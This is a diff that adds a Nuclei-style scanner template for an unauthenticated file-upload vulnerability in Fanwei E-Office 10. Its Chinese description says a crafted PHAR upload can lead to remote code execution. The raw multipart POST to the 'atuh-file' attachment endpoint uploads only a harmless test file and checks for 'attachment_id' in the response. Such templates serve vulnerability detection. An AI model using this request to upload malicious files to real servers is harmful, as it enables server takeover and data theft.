@@ -1,0 +1,33 @@
+id: fanwei-eoffice-atuh-file-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 这一漏洞的成功利用将会导致严重的安全后果。攻击者通过上传特制的PHAR文件，可以执行服务器上的任意代码，从而获得服务器的进一步控制权。最严重的情况下，这可能导致服务器的完全接管，敏感数据泄露，甚至将服务器转化为发起其他攻击的跳板。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/F8-16%E6%B3%9B%E5%BE%AE-E-Office-RCE?id=f8-16%e6%b3%9b%e5%be%ae-e-office-rce
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=7188335fc2b1af077684a437664d25b9
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5829.201 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Content-Length: 201
+
+        --7188335fc2b1af077684a437664d25b9
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+        Content-Length: 43
+
+        123
+        --7188335fc2b1af077684a437664d25b9--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'attachment_id'
+
